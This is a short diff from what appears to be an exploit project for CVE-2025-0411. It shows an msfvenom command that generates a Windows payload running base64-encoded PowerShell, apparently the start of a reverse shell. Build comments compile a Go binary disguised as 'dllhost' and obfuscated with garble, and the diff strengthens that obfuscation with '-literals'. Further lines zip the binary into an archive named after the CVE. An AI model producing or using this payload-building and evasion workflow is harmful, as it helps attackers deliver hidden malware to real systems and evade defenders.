@@ -85,7 +85,7 @@ msfvenom -p windows/exec cmd='powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUA
 
 //GOOS=windows GOARCH=amd64 go build
 
-//GOOS=windows GOARCH=amd64 garble build -o dllhost
+//GOOS=windows GOARCH=amd64 garble -literals build -o dllhost
 
 //zip cve-2025-0411.zip cve-2025-0411.exe
 //zip cve-2025-0411.zip dllhost
